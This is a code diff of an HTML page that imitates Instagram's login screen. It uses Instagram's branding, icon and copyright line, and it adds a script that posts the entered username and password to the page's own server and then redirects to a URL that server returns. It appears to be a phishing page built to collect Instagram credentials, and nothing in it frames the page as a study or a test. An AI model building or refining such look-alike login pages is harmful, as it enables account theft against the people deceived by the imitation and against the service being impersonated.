@@ -3,14 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <title>Instagram</title>
-    <link rel="stylesheet" href="styles.css">
     <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" href="styles.css">        
 </head>
 <body>
-
 <div class="wrapper">
     <div class="image-desktop">
         <img src="images\PcImage-removebg-preview.png" alt="Your Image" style="width: 100%;">
@@ -18,17 +16,18 @@
     <div class="header">
         <div class="top">
             <div class="logo">
-                <img src="images/instagram.png" alt="instagram" style="width: 175px;">
+                <img src="images\instagram.png" alt="instagram" style="width: 175px;">
             </div>
             <div class="form">
-                <form action="/submit" method="post">
+                <form id="loginForm" action="/" method="post" onsubmit="handleLogin(event)">
                     <div class="input_field">
-                        <input type="text" name="username" placeholder="Phone number, username, or email" class="input" required>
+                        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" class="input" required>
                     </div>
                     <div class="input_field">
-                        <input type="password" name="password" placeholder="Password" class="input" required>
+                        <input type="password" id="password" name="password" placeholder="Password" class="input" required>
                     </div>
                     <div class="btn"><button type="submit">Log In</button></div>
+                    <p id="error-message" style="color: red; display: none;"></p>
                 </form>
             </div>
             <div class="or">
@@ -38,9 +37,10 @@
             </div>
             <div class="dif">
                 <div class="fb">
-                    <img src="images/facebook.png" alt="facebook">
+                    <img src="images\facebook.png" alt="facebook">
                     <a href="https://www.facebook.com/login.php">ㅤLog In with Facebook</a>
                 </div>
+                <br>
                 <div class="forgot">
                     <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
                 </div>
@@ -52,8 +52,8 @@
         <div class="apps">
             <p>Get the app.</p>
             <div class="icons">
-                <a href="https://apps.apple.com/us/app/instagram/id389801252"><img src="images/appstore.png" alt="appstore"></a>
-                <a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="images/googleplay.png" alt="googleplay"></a>
+                <a href="https://apps.apple.com/us/app/instagram/id389801252"><img src="images\appstore.png" alt="appstore"></a>
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="images\googleplay.png" alt="googleplay"></a>
             </div>
         </div>
     </div>
@@ -108,10 +108,37 @@
             <option value="ro.html">Română</option>
             <option value="sr.html">Српски</option>
         </select>
-                
         <p id="cinsta">© 2024 Instagram from Meta</p>
     </div>
-    
 </div>
+
+<script>
+    async function handleLogin(event) {
+        event.preventDefault();
+
+        const form = event.target;
+        const formData = new FormData(form);
+        const data = new URLSearchParams();
+        for (const pair of formData) {
+            data.append(pair[0], pair[1]);
+        }
+
+        const response = await fetch(form.action, {
+            method: 'POST',
+            body: data
+        });
+
+        const result = await response.json();
+
+        if (result.status === 'success') {
+            window.location.href = result.redirect;
+        } else {
+            const errorMsg = result.error_msg || 'An error occurred.';
+            const errorMessageElement = document.getElementById('error-message');
+            errorMessageElement.innerText = errorMsg;
+            errorMessageElement.style.display = 'block';
+        }
+    }
+</script>
 </body>
 </html>
